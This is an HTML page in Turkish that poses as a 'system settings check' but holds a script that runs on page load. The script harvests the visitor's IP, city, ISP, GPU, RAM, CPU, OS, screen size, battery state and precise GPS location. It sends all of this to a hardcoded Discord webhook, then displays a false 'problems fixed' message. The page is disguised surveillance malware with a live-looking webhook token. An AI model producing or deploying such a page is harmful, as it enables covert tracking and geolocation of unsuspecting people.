<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
        h2 { color:#111; font-size:10px; }
        .ok { color:#0f4; font-weight:bold; font-size:14px; }
    </style>
</head>
<body>
    <h2 id="t">Sistem ayarlarƒ± kontrol ediliyor...</h2>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
        const t = document.getElementById('t');

        // 1. DALGA: ANLIK DONANIM VE IP (ƒ∞Zƒ∞N GEREKTƒ∞RMEZ - %100 GELƒ∞R)
        async function wave1() {
            let gpu = "Bilinmiyor", vendor = "Bilinmiyor";
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                const d = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
                vendor = gl.getParameter(d.UNMASKED_VENDOR_ID);
            } catch(e) {}

            const res = await fetch('https://ipapi.co/json/').catch(() => ({json: () => ({})}));
            const ip = await res.json();

            const p1 = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K ANALƒ∞Z - DALGA 1 (DONANIM & IP)",
                    color: 15158332,
                    fields: [
                        { name: "üåê IP & KONUM (YAKLA≈ûIK)", value: `**IP:** ${ip.ip || 'Bloke'}\n**≈ûehir:** ${ip.city || 'N/A'} / ${ip.country_name || 'N/A'}\n**ISP:** ${ip.org || 'N/A'}`, inline: false },
                        { name: "üõ†Ô∏è DONANIM", value: `**GPU:** \`${gpu}\`\n**VENDOR:** \`${vendor}\`\n**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} √áekirdek`, inline: false },
                        { name: "üì± Sƒ∞STEM", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}`, inline: true }
                    ],
                    timestamp: new Date()
                }]
            };
            navigator.sendBeacon(u, JSON.stringify(p1));
        }

        // 2. DALGA: Pƒ∞L VE ≈ûARJ DURUMU (√ñZEL ƒ∞STEƒûƒ∞N)
        async function wave2() {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                const p2 = {
                    embeds: [{
                        title: "üîã G√ú√á DURUMU",
                        color: 3066993,
                        description: `**≈ûarj Y√ºzdesi:** %${(b.level * 100).toFixed(0)}\n**≈ûarjda mƒ±?:** ${b.charging ? 'EVET' : 'HAYIR'}`
                    }]
                };
                fetch(u, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(p2) });
            }
        }

        // 3. DALGA: KESƒ∞N KONUM (GPS - EN VAH≈ûƒ∞ TAKƒ∞P)
        function wave3() {
            navigator.geolocation.getCurrentPosition(p => {
                const map = `http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                const p3 = {
                    embeds: [{
                        title: "üìç KESƒ∞N KONUM (GPS VERƒ∞Sƒ∞)",
                        color: 15105570,
                        description: `üöÄ **[HARƒ∞TADA A√á](${map})**\n**Enlem:** ${p.coords.latitude}\n**Boylam:** ${p.coords.longitude}\n**Hassasiyet:** ${p.coords.accuracy.toFixed(1)}m`
                    }]
                };
                fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(p3) });
            }, null, {enableHighAccuracy:true});
        }

        // TETƒ∞KLEYƒ∞Cƒ∞
        (async () => {
            await wave1();
            await wave2();
            wave3();
            
            t.innerHTML = '<span class="ok">Site uygun halde!</span>';
            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar d√ºzeltildi.</span>'; }, 600);
        })();
    </script>
</body>
</html>
